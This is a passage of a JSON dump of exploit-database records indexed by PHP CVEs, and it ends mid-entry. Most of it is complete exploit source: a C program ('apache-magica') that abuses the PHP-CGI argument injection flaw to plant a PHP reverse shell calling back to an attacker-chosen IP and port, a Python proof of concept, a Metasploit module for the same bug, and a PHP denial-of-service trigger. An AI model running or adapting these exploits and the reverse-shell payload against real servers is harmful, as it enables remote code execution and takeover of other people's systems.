/'\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n '//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\'\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <getopt.h>\r\n#include <sys/types.h>\r\n#include <stddef.h>\r\n#include <openssl/rand.h>\r\n#include <openssl/ssl.h>\r\n#include <openssl/err.h>\r\n#include <netdb.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n\r\ntypedef struct {\r\n\tint sockfd;\r\n\tSSL *handle;\r\n\tSSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(\"usage: %s <--target target> <--port port> <--protocol http|https> \" \\\r\n  \"<--reverse-ip ip> <--reverse-port port> [--force-interpreter interpreter]\\n\",\r\n   argv[0]);\r\n  exit(1);\r\n}\r\n\r\nchar poststr[] = \"POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F\" \\\r\n \"%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64\" \\\r\n \"+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73\" \\\r\n \"%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E\" \\\r\n \"%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63\" \\\r\n \"%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62\" \\\r\n \"%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74\" \\\r\n \"%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68\" \\\r\n \"%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F\" \\\r\n \"%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63\" \\\r\n \"%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73\" \\\r\n \"%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\\r\\n\" \\\r\n \"Host: %s\\r\\n\" \\\r\n \"User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26\" \\\r\n \"(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\" \\\r\n \"Content-Type: application/x-www-form-urlencoded\\r\\n\" \\\r\n \"Content-Length: %d\\r\\n\" \\\r\n \"Connection: close\\r\\n\\r\\n%s\";\r\nchar phpstr[] = \"<?php\\n\" \\\r\n\"set_time_limit(0);\\n\" \\\r\n\"$ip = '%s';\\n\" \\\r\n\"$port = %d;\\n\" \\\r\n\"$chunk_size = 1400;\\n\" \\\r\n\"$write_a = null;\\n\" \\\r\n\"$error_a = null;\\n\" \\\r\n\"$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n\" \\\r\n\"$daemon = 0;\\n\" \\\r\n\"$debug = 0;\\n\" \\\r\n\"if (function_exists('pcntl_fork')) {\\n\" \\\r\n\"\t$pid = pcntl_fork();\t\\n\" \\\r\n\"\tif ($pid == -1) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Can't fork\\\");\\n\" \\\r\n\"\t\texit(1);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif ($pid) {\\n\" \\\r\n\"\t\texit(0);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (posix_setsid() == -1) {\\n\" \\\r\n\"\t\tprintit(\\\"Error: Can't setsid()\\\");\\n\" \\\r\n\"\t\texit(1);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\t$daemon = 1;\\n\" \\\r\n\"} else {\\n\" \\\r\n\"\tprintit(\\\"WARNING: Failed to daemonise.\\\");\\n\" \\\r\n\"}\\n\" \\\r\n\"chdir(\\\"/\\\");\\n\" \\\r\n\"umask(0);\\n\" \\\r\n\"$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\n\" \\\r\n\"if (!$sock) {\\n\" \\\r\n\"\tprintit(\\\"$errstr ($errno)\\\");\\n\" \\\r\n\"\texit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"$descriptorspec = array(\\n\" \\\r\n\"   0 => array(\\\"pipe\\\", \\\"r\\\"),\\n\" \\\r\n\"   1 => array(\\\"pipe\\\", \\\"w\\\"),\\n\" \\\r\n\"   2 => array(\\\"pipe\\\", \\\"w\\\")\\n\" \\\r\n\");\\n\" \\\r\n\"$process = proc_open($shell, $descriptorspec, $pipes);\\n\" \\\r\n\"if (!is_resource($process)) {\\n\" \\\r\n\"\tprintit(\\\"ERROR: Can't spawn shell\\\");\\n\" \\\r\n\"\texit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"stream_set_blocking($pipes[0], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[1], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[2], 0);\\n\" \\\r\n\"stream_set_blocking($sock, 0);\\n\" \\\r\n\"while (1) {\\n\" \\\r\n\"\tif (feof($sock)) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Shell connection terminated\\\");\\n\" \\\r\n\"\t\tbreak;\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (feof($pipes[1])) {\\n\" \\\r\n\"\t\tprintit(\\\"ERROR: Shell process terminated\\\");\\n\" \\\r\n\"\t\tbreak;\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\" \\\r\n\"\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\" \\\r\n\"\tif (in_array($sock, $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"SOCK READ\\\");\\n\" \\\r\n\"\t\t$input = fread($sock, $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"SOCK: $input\\\");\\n\" \\\r\n\"\t\tfwrite($pipes[0], $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (in_array($pipes[1], $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDOUT READ\\\");\\n\" \\\r\n\"\t\t$input = fread($pipes[1], $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDOUT: $input\\\");\\n\" \\\r\n\"\t\tfwrite($sock, $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"\tif (in_array($pipes[2], $read_a)) {\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDERR READ\\\");\\n\" \\\r\n\"\t\t$input = fread($pipes[2], $chunk_size);\\n\" \\\r\n\"\t\tif ($debug) printit(\\\"STDERR: $input\\\");\\n\" \\\r\n\"\t\tfwrite($sock, $input);\\n\" \\\r\n\"\t}\\n\" \\\r\n\"}\\n\" \\\r\n\"\\n\" \\\r\n\"fclose($sock);\\n\" \\\r\n\"fclose($pipes[0]);\\n\" \\\r\n\"fclose($pipes[1]);\\n\" \\\r\n\"fclose($pipes[2]);\\n\" \\\r\n\"proc_close($process);\\n\" \\\r\n\"function printit ($string) {\\n\" \\\r\n\"\tif (!$daemon) {\\n\" \\\r\n\"\t\tprint \\\"$string\\n\\\";\\n\" \\\r\n\"\t}\\n\" \\\r\n\"}\\n\" \\\r\n\"exit(1);\\n\" \\\r\n\"?>\";\r\n\r\nstruct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)\r\n{\r\n struct hostent *he;\r\n struct sockaddr_in server, *servercopy;\r\n \r\n if ((he=gethostbyname(hostname)) == NULL) {\r\n  printf(\"Hostname cannot be resolved\\n\");\r\n  exit(255);\r\n }\r\n \r\n servercopy = malloc(sizeof(struct sockaddr_in));\r\n if (!servercopy) {\r\n\tprintf(\"malloc error (1)\\n\");\r\n\texit(255);\r\n }\r\n memset(&server, '\\0', sizeof(struct sockaddr_in));\r\n memcpy(&server.sin_addr, he->h_addr_list[0],  he->h_length);\r\n server.sin_family = AF_INET;\r\n server.sin_port = htons(port);\r\n memcpy(servercopy, &server, sizeof(struct sockaddr_in));\r\n return servercopy;\r\n}\r\n\r\nchar *sslread(connection *c)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = SSL_read(c->handle, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nchar *read_(int sockfd)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = read(sockfd, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nvoid main(int argc, char *argv[])\r\n{\r\n  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,\r\n   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;\r\n  char httpsflag=0;\r\n  unsigned short port=0, reverseport=0;\r\n  struct sockaddr_in *server;\r\n  int sockfd;\r\n  unsigned int writesize, tmpsize;\r\n  unsigned int i;\r\n  connection *sslconnection;\r\n  printf(\"-== Apache Magika by Kingcope ==-\\n\");\r\n  for(;;)\r\n  {\r\n\t int c;\r\n     int option_index=0;\r\n     static struct option long_options[] = {\r\n\t   {\"target\", required_argument, 0, 0 },\r\n\t   {\"port\", required_argument, 0, 0 },\r\n\t   {\"protocol\", required_argument, 0, 0 },\r\n\t   {\"reverse-ip\", required_argument, 0, 0 },\r\n\t   {\"reverse-port\", required_argument, 0, 0 },\r\n\t   {\"force-interpreter\", required_argument, 0, 0 },\t   \r\n\t   {0, 0, 0, 0 }\r\n\t  };\r\n\t \r\n\t c = getopt_long(argc, argv, \"\", long_options, &option_index);\r\n     if (c < 0)\r\n     \tbreak;\r\n     \r\n     switch (c) {\r\n\t case 0:\r\n\t  switch (option_index) {\r\n\t   case 0:\r\n\t    if (optarg) {\r\n\t     target = calloc(strlen(optarg)+1, sizeof(char));\r\n\t     if (!target) {\r\n\t\t  printf(\"calloc error (2)\\n\");\r\n\t      exit(255);\r\n         }\r\n\t     memcpy(target, optarg, strlen(optarg)+1);\r\n    \t}\r\n        break;\r\n       case 1:\r\n        if(optarg)\r\n\t     port = atoi(optarg);\r\n        break;\r\n       case 2:\r\n        protocol = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!protocol) {\r\n\t     printf(\"calloc error (3)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(protocol, optarg, strlen(optarg)+1);\r\n        if (!strcmp(protocol, \"https\"))\r\n         httpsflag=1;\r\n        break;\r\n       case 3:\r\n        reverseip = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseip) {\r\n\t     printf(\"calloc error (4)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseip, optarg, strlen(optarg)+1);       \r\n        break;\r\n       case 4:\r\n\t    reverseport = atoi(optarg);       \r\n\t\treverseportstr = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseportstr) {\r\n\t     printf(\"calloc error (5)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseportstr, optarg, strlen(optarg)+1);  \t     \r\n        break;\r\n       case 5:\r\n        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!forceinterpreter) {\r\n\t     printf(\"calloc error (6)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       \r\n        break;\r\n       default:\r\n        usage(argv);\r\n\t  }\r\n\t  break;\r\n\t \r\n\t default:\r\n\t  usage(argv);\r\n     }\r\n  }\r\n\r\n  if ((optind < argc) || !target || !protocol || !port ||\r\n      !reverseip || !reverseport){\r\n\tusage(argv);\r\n  }\r\n  \r\n  server = gethostbyname_(target, port);\r\n  if (!server) {\r\n   printf(\"Error while resolving hostname. (7)\\n\");\r\n   exit(255);\r\n  }\r\n\r\n  char *interpreters[5];\r\n  int ninterpreters = 5;\r\n  interpreters[0] = strdup(\"/cgi-bin/php\");\r\n  interpreters[1] = strdup(\"/cgi-bin/php5\");\r\n  interpreters[2] = strdup(\"/cgi-bin/php-cgi\");\r\n  interpreters[3] = strdup(\"/cgi-bin/php.cgi\");\r\n  interpreters[4] = strdup(\"/cgi-bin/php4\");\r\n  \r\n  for (i=0;i<ninterpreters;i++) {\r\n   interpreter = interpreters[i];\r\n   if (forceinterpreter) {\r\n     interpreter = strdup(forceinterpreter);\r\n   }\r\n   if (forceinterpreter && i)\r\n    break;\r\n   printf(\"%s\\n\", interpreter);\r\n   \r\n   sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n   if (sockfd < 1) { \r\n\t printf(\"socket error (8)\\n\");\r\n\t exit(255);\r\n   }\r\n  \r\n   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {\r\n    printf(\"connect error (9)\\n\");\r\n    exit(255);\t  \r\n   }\r\n   if (httpsflag) {\r\n    sslconnection = (connection*) malloc(sizeof(connection));\r\n    if (!sslconnection) {\r\n     printf(\"malloc error (10)\\n\");\r\n     exit(255);   \r\n    }\r\n    sslconnection->handle = NULL;\r\n    sslconnection->ctx = NULL;\r\n\r\n    SSL_library_init();\r\n\r\n    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());\r\n    if (!sslconnection->ctx) {\r\n \t printf(\"SSL_CTX_new error (11)\\n\");\r\n     exit(255);\r\n    }\r\n\r\n    sslconnection->handle = SSL_new(sslconnection->ctx);\r\n    if (!sslconnection->handle) {\r\n \t printf(\"SSL_new error (12)\\n\");\r\n\t exit(255);   \r\n    }\r\n    if (!SSL_set_fd(sslconnection->handle, sockfd)) {\r\n \t printf(\"SSL_set_fd error (13)\\n\");\r\n     exit(255);\r\n    }\r\n   \r\n    if (SSL_connect(sslconnection->handle) != 1) {\r\n\t printf(\"SSL_connect error (14)\\n\");\r\n     exit(255);       \r\n    }\r\n   }\r\n  \r\n   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;\r\n   tmpstr = (char*)calloc(tmpsize, sizeof(char));\r\n   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);\r\n   \r\n   writesize = strlen(target) + strlen(interpreter) + \r\n     strlen(poststr) + strlen(tmpstr) + 64;\r\n   writestr = (char*)calloc(writesize, sizeof(char));\r\n   snprintf(writestr, writesize, poststr, interpreter,\r\n     target, strlen(tmpstr), tmpstr);\r\n  \r\n   if (!httpsflag) {\r\n\t write(sockfd, writestr, strlen(writestr));\r\n\t readbuf = read_(sockfd);\r\n   } else {\r\n\t SSL_write(sslconnection->handle, writestr, strlen(writestr));\r\n\t readbuf = sslread(sslconnection);\r\n   }\r\n  \r\n   if (readbuf) {\r\n     printf(\"***SERVER RESPONSE***\\n\\n%s\\n\\n\", readbuf);  \r\n   } else {\r\n    printf(\"read error (15)\\n\");\r\n    exit(255);\t  \r\n   }\r\n  }\r\n  exit(1);\r\n}\r\n\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:29290"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP CGI Argument Injection Exploit. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2012-05-05T00:00:00",
            "published": "2012-05-05T00:00:00",
            "id": "EDB-ID:18836",
            "href": "https://www.exploit-db.com/exploits/18836/",
            "type": "exploitdb",
            "title": "PHP CGI Argument Injection Exploit",
            "sourceData": "######################################################################################\r\n# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit\r\n# Date: May 4, 2012\r\n# Author: rayh4c[0x40]80sec[0x2e]com\r\n# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com\r\n######################################################################################\r\n\r\nimport socket\r\nimport sys\r\n\r\ndef cgi_exploit():\r\n        pwn_code = \"\"\"<?php phpinfo();?>\"\"\" \r\n        post_Length = len(pwn_code)\r\n        http_raw=\"\"\"POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\n%s\r\n\"\"\" %(HOST , post_Length ,pwn_code)\r\n        print http_raw\r\n        try:\r\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            sock.connect((HOST, int(PORT)))\r\n            sock.send(http_raw)\r\n            data = sock.recv(10000)\r\n            print repr(data)\r\n            sock.close()\r\n        except socket.error, msg:\r\n            sys.stderr.write(\"[ERROR] %s\\n\" % msg[1])\r\n            sys.exit(1)\r\n               \r\nif __name__ == '__main__':\r\n        try:\r\n            HOST = sys.argv[1]\r\n            PORT = sys.argv[2]\r\n            cgi_exploit()\r\n        except IndexError:\r\n            print '[+]Usage: cgi_test.py site.com 80'\r\n            sys.exit(-1)",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18836"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP CGI Argument Injection. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2012-05-04T00:00:00",
            "published": "2012-05-04T00:00:00",
            "id": "EDB-ID:18834",
            "href": "https://www.exploit-db.com/exploits/18834/",
            "type": "exploitdb",
            "title": "PHP CGI Argument Injection",
            "sourceData": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = ExcellentRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpClient\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'PHP CGI Argument Injection',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tWhen run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\r\n\t\t\t\tan argument injection vulnerability.  This module takes advantage of\r\n\t\t\t\tthe -d flag to set php.ini directives to achieve code execution.\r\n\t\t\t\tFrom the advisory: \"if there is NO unescaped '=' in the query string,\r\n\t\t\t\tthe string is split on '+' (encoded space) characters, urldecoded,\r\n\t\t\t\tpassed to a function that escapes shell metacharacters (the \"encoded in\r\n\t\t\t\ta system-defined manner\" from the RFC) and then passes them to the CGI\r\n\t\t\t\tbinary.\"\r\n\t\t\t},\r\n\t\t\t'Author'         => [ 'egypt', 'hdm' ],\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     => [\r\n\t\t\t\t\t[ \"CVE\"\t, \"2012-1823\" ],\r\n\t\t\t\t\t[ \"URL\"\t, \"http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/\" ],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t\t# Arbitrary big number. The payload gets sent as an HTTP\r\n\t\t\t\t\t# response body, so really it's unlimited\r\n\t\t\t\t\t'Space'       => 262144, # 256k\r\n\t\t\t\t},\r\n\t\t\t'DisclosureDate' => 'May 03 2012',\r\n\t\t\t'Platform'       => 'php',\r\n\t\t\t'Arch'           => ARCH_PHP,\r\n\t\t\t'Targets'        => [[ 'Automatic', { }]],\r\n\t\t\t'DefaultTarget' => 0))\r\n\r\n\t\tregister_options([\r\n\t\t\tOptString.new('TARGETURI', [false, \"The URI to request (must be a CGI-handled PHP script)\"]),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\t# php-cgi -h\r\n\t# ...\r\n\t#   -s               Display colour syntax highlighted source.\r\n\tdef check\r\n\t\turi = target_uri.path\r\n\r\n\t\turi.gsub!(/\\?.*/, \"\")\r\n\r\n\t\tprint_status(\"Checking uri #{uri}\")\r\n\r\n\t\tresponse = send_request_raw({ 'uri' => uri })\r\n\r\n\t\tif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\r\n\t\t\tprint_error(\"Server responded in a way that was ambiguous, could not determine whether it was vulnerable\")\r\n\t\t\treturn Exploit::CheckCode::Unknown\r\n\t\tend\r\n\r\n\t\tresponse = send_request_raw({ 'uri' => uri + '?-s'})\r\n\t\tif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\r\n\t\tprint_error(\"Server responded indicating it was not vulnerable\")\r\n\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\tdef exploit\r\n\t\tbegin\r\n\t\t\targs = [\r\n\t\t\t\t\"-d+allow_url_include%3d#{rand_php_ini_true}\",\r\n\t\t\t\t\"-d+safe_mode%3d#{rand_php_ini_false}\",\r\n\t\t\t\t\"-d+suhosin.simulation%3d#{rand_php_ini_true}\",\r\n\t\t\t\t\"-d+disable_functions%3d%22%22\",\r\n\t\t\t\t\"-d+open_basedir%3dnone\",\r\n\t\t\t\t\"-d+auto_prepend_file%3dphp://input\",\r\n\t\t\t\t\"-n\"\r\n\t\t\t]\r\n\r\n\t\t\tqs = args.join(\"+\")\r\n\t\t\turi = \"#{target_uri}?#{qs}\"\r\n\r\n\t\t\t# Has to be all on one line, so gsub out the comments and the newlines\r\n\t\t\tpayload_oneline = \"<?php \" + payload.encoded.gsub(/\\s*#.*$/, \"\").gsub(\"\\n\", \"\")\r\n\t\t\tresponse = send_request_cgi( {\r\n\t\t\t\t'method' => \"POST\",\r\n\t\t\t\t'global' => true,\r\n\t\t\t\t'uri'    => uri,\r\n\t\t\t\t'data'   => payload_oneline,\r\n\t\t\t}, 0.5)\r\n\t\t\thandler\r\n\r\n\t\trescue ::Interrupt\r\n\t\t\traise $!\r\n\t\trescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\r\n\t\t\tprint_error(\"The target service unreachable\")\r\n\t\trescue ::OpenSSL::SSL::SSLError\r\n\t\t\tprint_error(\"The target failed to negotiate SSL, is this really an SSL service?\")\r\n\t\tend\r\n\r\n\tend\r\n\r\n\tdef rand_php_ini_false\r\n\t\tRex::Text.to_rand_case([ \"0\", \"off\", \"false\" ][rand(3)])\r\n\tend\r\n\r\n\tdef rand_php_ini_true\r\n\t\tRex::Text.to_rand_case([ \"1\", \"on\", \"true\" ][rand(3)])\r\n\tend\r\n\r\nend\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18834"
        }
    ],
    "CVE-2011-1469": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46970\r\nCVE ID: CVE-2011-1469\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nPHP \u201cOpenSSL\u201d\u6269\u5c55\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u4f7f\u5e94\u7528\u7a0b\u5e8f\u5d29\u6e83\uff0c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\n\nMandrakeSoft Corporate Server 4.0 x86_64\r\nMandrakeSoft Corporate Server 4.0\r\nPHP PHP 5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2011-03-27T00:00:00",
            "published": "2011-03-27T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20393",
            "id": "SSV:20393",
            "type": "seebug",
            "title": "PHP Stream\u7ec4\u4ef6\u8fdc\u7a0b\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "\n                                                &lt;?php\r\n\r\n        $uri = 'ftp://www.example.com/pub/pkg-shadow/shadow-4.1.4.3.tar.bz2';\r\n        $proxy = 'tcp://proxy:8080';\r\n\r\n        $opts = array(\r\n                'ftp' =&gt; array(\r\n                        'proxy' =&gt; $proxy\r\n                )\r\n        );\r\n\r\n        $context = stream_context_create($opts);\r\n        stream_context_set_params($context, array());\r\n\r\n        $fh = fopen($uri, 'r', false, $context);\r\n        while (!feof($fh)) {\r\n                echo &quot;foo\\n&quot;;\r\n                fread($fh, 4 * 1024);\r\n        }\r\n\r\n        fclose($fh);\r\n\r\n?&gt;\r\n\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20393"
        }
    ],
    "CVE-2012-2688": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 54638\r\nCVE ID: CVE-2012-2688\r\n\r\nPHP \u662f\u4e00\u79cd HTML \u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\uff0cPHP\u4e0e\u5fae\u8f6f\u7684ASP\u9887\u6709\u51e0\u5206\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u79cd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u7684\u5d4c\u5165HTML\u6587\u6863\u7684\u811a\u672c\u8bed\u8a00\uff0c\u8bed\u8a00\u7684\u98ce\u683c\u6709\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\uff0c\u73b0\u5728\u88ab\u5f88\u591a\u7684\u7f51\u7ad9\u7f16\u7a0b\u4eba\u5458\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\r\n\r\nPHP 5.3.15\u548c5.4.5\u4e4b\u524d\u7248\u672c\u7684_php_stream_scandir\u51fd\u6570\u5728\u6d41\u7684\u5b9e\u73b0\u4e2d\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u5141\u8bb8\u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u53d7\u5f71\u54cd\u7684Web\u670d\u52a1\u5668\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n0\nPHP &lt; 5.4.5\r\nPHP &lt; 5.3.15\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-07-25T00:00:00",
            "published": "2012-07-25T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60291",
            "id": "SSV:60291",
            "type": "seebug",
            "title": "PHP '_php_stream_scandir()'\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60291"
        }
    ],
    "CVE-2011-0708": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP Exif Extension 'exif_read_data()' Function Remote DoS. CVE-2011-0708. Dos exploits for multiple platform",
            "modified": "2011-02-28T00:00:00",
            "published": "2011-02-28T00:00:00",
            "id": "EDB-ID:16261",
            "href": "https://www.exploit-db.com/exploits/16261/",
            "type": "exploitdb",
